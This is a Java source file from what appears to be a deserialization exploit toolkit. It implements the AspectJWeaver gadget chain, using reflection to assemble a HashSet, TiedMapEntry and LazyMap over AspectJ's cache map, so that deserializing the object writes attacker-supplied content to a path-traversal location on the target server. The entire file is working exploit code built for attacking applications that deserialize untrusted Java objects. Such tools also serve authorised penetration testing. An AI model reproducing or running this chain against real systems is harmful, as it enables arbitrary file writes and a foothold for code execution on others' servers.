package com.ppp.chain.aspectjweaver;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;


@Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
@Authors({Authors.JANG})
@Sink({Sink.Default})
public class AspectJWeaver implements ObjectPayload<Object> {

    private static String folder = ".";

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(AspectJWeaver.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(AspectJWeaver.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.FileWrite);
        sinksHelper.setFileContent("123");
        sinksHelper.setServerFilePath("../../../../../../../../../../../../../../../../../../../../../../../../tmp/AspectJWeaver.txt");
//        sinksHelper.setServerFilePath("/tmp/AspectJWeaver.txt");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(AspectJWeaver.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
//        // sink
        byte[] contentBytes = (byte[]) SinkScheduler.builder(sinksHelper);

        String serverFilePath = sinksHelper.getServerFilePath();
        if (!serverFilePath.startsWith("../")) {
            Printer.warn("AspectJWeaver gadget default path is ./+{path}, please input server file path as ../../../tmp/1.txt");
        }
        Printer.warn("This gadget will create cache.idx in server path " + folder);

        Object kickOffObject = getChain(contentBytes, serverFilePath);

        return kickOffObject;
    }

    public Object getChain(byte[] contentBytes, String serverFilePath) throws Exception {
        String s = RanDomUtils.generateRandomString(1);

        Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");

        Object simpleCache = ctor.newInstance(folder, 12);
        Transformer transformer = new ConstantTransformer(contentBytes);
        Map lazyMap = LazyMap.decorate((Map) simpleCache, transformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, serverFilePath);

        HashSet hashset = new HashSet(1);
        hashset.add(s);
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return hashset;
    }
}
